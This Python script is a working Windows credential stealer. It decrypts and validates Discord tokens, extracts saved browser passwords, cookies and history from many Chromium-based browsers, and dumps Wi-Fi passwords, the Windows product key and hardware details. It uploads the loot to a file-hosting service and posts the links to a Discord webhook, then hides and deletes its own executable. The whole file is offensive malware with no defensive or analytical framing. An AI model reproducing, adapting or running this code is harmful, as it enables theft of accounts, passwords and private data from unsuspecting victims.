import os, sys, json, base64, urllib.request, urllib.parse, re, ctypes, subprocess, sqlite3, shutil, random, uuid, platform
from datetime import datetime
from pathlib import Path

if os.name != "nt":
    sys.exit(0)
else:
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    import win32api
    import win32con

LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")
TEMP = os.getenv("TEMP", "")

WEBHOOK = "WEBHOOK_URL"

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
}

BROWSERS = {
    'kometa': LOCAL + '\\Kometa\\User Data',
    'orbitum': LOCAL + '\\Orbitum\\User Data',
    'cent-browser': LOCAL + '\\CentBrowser\\User Data',
    '7star': LOCAL + '\\7Star\\7Star\\User Data',
    'sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'google-chrome-sxs': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
    'yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
    'brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': LOCAL + '\\Iridium\\User Data',
    'opera': ROAMING + '\\Opera Software\\Opera Stable',
    'opera-gx': ROAMING + '\\Opera Software\\Opera GX Stable',
    'coc-coc': LOCAL + '\\CocCoc\\Browser\\User Data'
}

PROFILES = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

def run_cmd(cmd):
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return result.stdout.strip()
    except:
        return "unknown"

def get_hwid():
    try:
        return run_cmd('wmic csproduct get uuid /value').replace('UUID=', '').replace('\n', '').strip()
    except:
        return str(uuid.uuid4())

def get_mac():
    try:
        for line in os.popen('ipconfig /all'):
            if 'Physical Address' in line:
                return line.split(':')[1].strip()
    except:
        pass
    return "unknown"

def get_gpu():
    try:
        return run_cmd('wmic path win32_VideoController get name /value').replace('Name=', '').strip()
    except:
        return "unknown"

def get_cpu():
    try:
        return run_cmd('wmic cpu get name /value').replace('Name=', '').strip()
    except:
        return platform.processor()

def get_ram():
    try:
        ram = run_cmd('wmic computersystem get totalphysicalmemory /value').replace('TotalPhysicalMemory=', '').strip()
        return str(round(int(ram) / (1024**3), 2)) + " GB"
    except:
        return "unknown"

def get_screen_res():
    try:
        user32 = ctypes.windll.user32
        return f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
    except:
        return "unknown"

def get_windows_key():
    try:
        return run_cmd('wmic path softwarelicensingservice get OA3xOriginalProductKey /value').replace('OA3xOriginalProductKey=', '').strip()
    except:
        return "unknown"

def get_antivirus():
    try:
        result = run_cmd('powershell -Command "Get-WmiObject -Namespace \'Root\\SecurityCenter2\' -Class AntivirusProduct | Select-Object displayName"')
        lines = [l.strip() for l in result.split('\n') if l.strip() and 'displayName' not in l and '---' not in l]
        return ', '.join(lines) if lines else "Windows Defender / None"
    except:
        return "unknown"

def get_wifi_passwords():
    networks = {}
    try:
        profiles = run_cmd('netsh wlan show profiles')
        for line in profiles.split('\n'):
            if 'Profile' in line and ':' in line:
                profile = line.split(':')[1].strip()
                if profile:
                    info = run_cmd(f'netsh wlan show profile name="{profile}" key=clear')
                    for line2 in info.split('\n'):
                        if 'Key Content' in line2:
                            pwd = line2.split(':')[1].strip() if ':' in line2 else ''
                            networks[profile] = pwd
    except:
        pass
    return networks

def get_system_info():
    return {
        "username": os.getenv("USERNAME", "unknown"),
        "hostname": os.getenv("COMPUTERNAME", "unknown"),
        "hwid": get_hwid(),
        "uuid": run_cmd('wmic csproduct get uuid /value').replace('UUID=', '').strip(),
        "mac": get_mac(),
        "ip": get_ip(),
        "cpu": get_cpu(),
        "gpu": get_gpu(),
        "ram": get_ram(),
        "screen": get_screen_res(),
        "os": platform.platform(),
        "windows_key": get_windows_key(),
        "antivirus": get_antivirus(),
        "wifi_networks": get_wifi_passwords(),
        "time": datetime.now().isoformat()
    }

def upload_gofile(content, filename):
    """Upload content to Gofile and return download link"""
    try:
        temp_path = os.path.join(TEMP, filename)
        with open(temp_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        # Get available server
        req = urllib.request.Request(
            'https://api.gofile.io/getServer',
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            server_data = json.loads(response.read().decode())
            server = server_data['data']['server']
        
        # Upload file
        boundary = '----WebKitFormBoundary' + ''.join(random.choice('0123456789abcdef') for _ in range(16))
        
        with open(temp_path, 'rb') as f:
            file_data = f.read()
        
        body = []
        body.append(f'--{boundary}')
        body.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"')
        body.append('Content-Type: text/plain')
        body.append('')
        body.append(file_data.decode('utf-8', errors='ignore'))
        body.append(f'--{boundary}--')
        body.append('')
        
        body_bytes = '\r\n'.join(body).encode('utf-8', errors='ignore')
        
        upload_req = urllib.request.Request(
            f'https://{server}.gofile.io/uploadFile',
            data=body_bytes,
            headers={
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'User-Agent': 'Mozilla/5.0'
            },
            method='POST'
        )
        
        with urllib.request.urlopen(upload_req, timeout=60) as response:
            upload_data = json.loads(response.read().decode())
            code = upload_data['data']['code']
            link = f"https://gofile.io/d/{code}"
        
        os.remove(temp_path)
        return link
        
    except:
        return None

def cleanup():
    try:
        if hasattr(sys, 'frozen'):
            exe_path = sys.executable
            bat_path = os.path.join(TEMP, 'c.bat')
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{exe_path}"\ndel /f /q "%~f0"')
            subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def getkey(path):
    try:
        with open(path + "\\Local State", "r", encoding='utf-8', errors='ignore') as f:
            return json.loads(f.read())['os_crypt']['encrypted_key']
    except:
        return None

def gettokens(path):
    tokens = []
    ldb_path = path + "\\Local Storage\\leveldb\\"
    if not os.path.exists(ldb_path):
        return tokens
    for file in os.listdir(ldb_path):
        if not file.endswith((".ldb", ".log")):
            continue
        try:
            with open(f"{ldb_path}{file}", "r", errors="ignore") as f:
                content = f.read()
                for match in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", content):
                    tokens.append(match)
        except:
            continue
    return tokens

def decrypt_token(encrypted_token, key):
    try:
        encrypted = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
        decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
        
        # Using cryptography instead of pycryptodome
        iv = encrypted[3:15]
        ciphertext = encrypted[15:-16]
        tag = encrypted[-16:]
        
        cipher = Cipher(algorithms.AES(decrypted_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        return decrypted.decode('utf-8')
    except:
        return None

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as r:
            return json.loads(r.read().decode()).get("ip", "unknown")
    except:
        return "unknown"

def get_browser_master_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_browser_data(buff, master_key):
    try:
        # Using cryptography instead of pycryptodome
        iv = buff[3:15]
        ciphertext = buff[15:-16]
        tag = buff[-16:]
        
        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        return decrypted.decode('utf-8')
    except:
        return ""

def extract_browser_data():
    results = {"passwords": "", "cookies": "", "history": ""}
    gofile_links = {}
    
    for name, path in BROWSERS.items():
        if not os.path.isdir(path):
            continue
            
        master_key = get_browser_master_key(path)
        if not master_key:
            continue
            
        for profile in PROFILES:
            profile_path = path if name in ['opera', 'opera-gx'] else os.path.join(path, profile)
            
            # passwords
            try:
                login_db = os.path.join(profile_path, 'Login Data')
                if os.path.exists(login_db):
                    temp_db = os.path.join(TEMP, f"{name}_{profile}_login.db")
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    
                    for row in cursor.fetchall():
                        url, username, encrypted_pass = row
                        if url and username and encrypted_pass:
                            password = decrypt_browser_data(encrypted_pass, master_key)
                            if password:
                                results["passwords"] += f"[{name}/{profile}] {url} | {username}:{password}\n"
                    
                    cursor.close()
                    conn.close()
                    os.remove(temp_db)
            except:
                pass
            
            # cookies
            try:
                cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
                if os.path.exists(cookie_db):
                    temp_db = os.path.join(TEMP, f"{name}_{profile}_cookies.db")
                    shutil.copy2(cookie_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
                    
                    for row in cursor.fetchall():
                        host, cname, cpath, encrypted_value, expires = row
                        value = decrypt_browser_data(encrypted_value, master_key)
                        if host and cname and value:
                            results["cookies"] += f"{host}\t{'FALSE' if expires == 0 else 'TRUE'}\t{cpath}\t{'FALSE' if host.startswith('.') else 'TRUE'}\t{expires}\t{cname}\t{value}\n"
                    
                    cursor.close()
                    conn.close()
                    os.remove(temp_db)
            except:
                pass
            
            # history
            try:
                history_db = os.path.join(profile_path, 'History')
                if os.path.exists(history_db):
                    temp_db = os.path.join(TEMP, f"{name}_{profile}_history.db")
                    shutil.copy2(history_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                    
                    for row in cursor.fetchall():
                        url, title, visits, last_visit = row
                        if url:
                            results["history"] += f"[{name}/{profile}] {title} | {url} (Visits: {visits})\n"
                    
                    cursor.close()
                    conn.close()
                    os.remove(temp_db)
            except:
                pass
    
    # Upload to Gofile
    if results["passwords"]:
        link = upload_gofile(results["passwords"], "passwords.txt")
        if link:
            gofile_links["passwords"] = link
    
    if results["cookies"]:
        link = upload_gofile(results["cookies"], "cookies.txt")
        if link:
            gofile_links["cookies"] = link
            
    if results["history"]:
        link = upload_gofile(results["history"], "history.txt")
        if link:
            gofile_links["history"] = link
    
    return gofile_links

def send_webhook(data, hostname):
    try:
        json_str = json.dumps(data)
        encoded = base64.b64encode(json_str.encode()).decode()
        
        message = f"{hostname} @everyone\n`{encoded}`"
        
        payload = json.dumps({
            "content": message
        })
        
        req = urllib.request.Request(
            WEBHOOK,
            data=payload.encode(),
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            method='POST'
        )
        urllib.request.urlopen(req, timeout=10)
            
    except:
        pass

def main():
    checked = []
    results = {
        "system": get_system_info(),
        "discord": [],
        "browser_data": {}
    }
    
    hostname = os.getenv("COMPUTERNAME", "UNKNOWN_PC")
    
    # get tokens
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
            
        key = getkey(path)
        if not key:
            continue
            
        for token in gettokens(path):
            token = token.rstrip("\\")
            decrypted = decrypt_token(token, key)
            if not decrypted or decrypted in checked:
                continue
            checked.append(decrypted)
            
            try:
                req = urllib.request.Request(
                    'https://discord.com/api/v10/users/@me',
                    headers={"Authorization": decrypted, "User-Agent": "Mozilla/5.0"},
                    method='GET'
                )
                with urllib.request.urlopen(req, timeout=5) as res:
                    user = json.loads(res.read().decode())
                    
                results["discord"].append({
                    "token": decrypted,
                    "username": user.get("username", "unknown"),
                    "userid": user.get("id", "unknown"),
                    "email": user.get("email", "none"),
                    "phone": user.get("phone", "none"),
                    "source": platform,
                    "verified": user.get("verified", False),
                    "mfa": user.get("mfa_enabled", False),
                    "nitro": user.get("premium_type", 0)
                })
            except:
                continue
    
    results["browser_data"] = extract_browser_data()
    
    send_webhook(results, hostname)
    
    try:
        ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
    except:
        pass
        
    cleanup()

if __name__ == "__main__":
    main()
